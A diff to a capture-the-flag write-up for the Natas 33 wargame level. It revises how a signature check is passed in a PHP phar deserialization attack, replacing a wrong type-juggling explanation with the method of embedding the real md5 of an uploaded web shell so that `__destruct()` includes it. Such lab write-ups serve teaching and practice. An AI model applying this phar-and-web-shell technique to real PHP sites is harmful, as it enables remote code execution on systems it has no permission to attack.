@@ -96,23 +96,15 @@ if ($signature !== $expected) {
 }
 ```
 
-But in Natas 33, the `$signature` variable:
+But the check in Natas 33 is **strict** (`===`): `if ($this->signature === md5(file_get_contents($this->filename)))`. Here the `$signature = True` trick **does not work** — `True === "any_md5"` is always **false** (a bool and a string are type-mismatched), so there is no type-juggling bypass.
+
+The real trick: **you control both the file AND the `$signature` inside the phar metadata.** You compute the md5 of the shell content you uploaded yourself and write it into `$signature`:
 
 ```php
-class Executor {
-    private $filename;
-    private $signature = True;    // ← True!
-    private $init = False;
-}
+$signature = md5(file_get_contents("shell.php"));   // md5 of the file you uploaded
 ```
 
-`$signature = True` → `True == md5(...)` → PHP loose comparison:
-
-```php
-True == "anystring"   // true!  (non-empty string → truthy)
-```
-
-So the signature check is `True == [any_md5]` → always true → bypass!
+This way `$signature === md5(file_get_contents($filename))` is **satisfied exactly** → `include($filename)` runs. (No type-juggling with strict comparison; instead we set the signature to the real md5.)
 
 ---
 
@@ -153,7 +145,7 @@ if(isset($_POST['filename'])) {
 
 **Analysis:**
 
-1. `$signature = True` → the signature check always passes (loose comparison)
+1. `===` strict comparison → to pass the signature, set `$signature` to the md5 of the file you uploaded (computed below)
 2. `__destruct()` → `include($this->filename)` → include a web shell via phar://
 3. There's a file upload → we can upload a malicious phar
 
@@ -180,7 +172,8 @@ curl -u natas33:[password] \
 <?php
 class Executor {
     private $filename = "shell.php";
-    private $signature = True;
+    // md5 of shell.php's contents (the file you uploaded) — passes the === check:
+    private $signature = "SHELL_MD5";   // = md5(file_get_contents("shell.php")); compute first, then paste here
     private $init = True;
 }
 
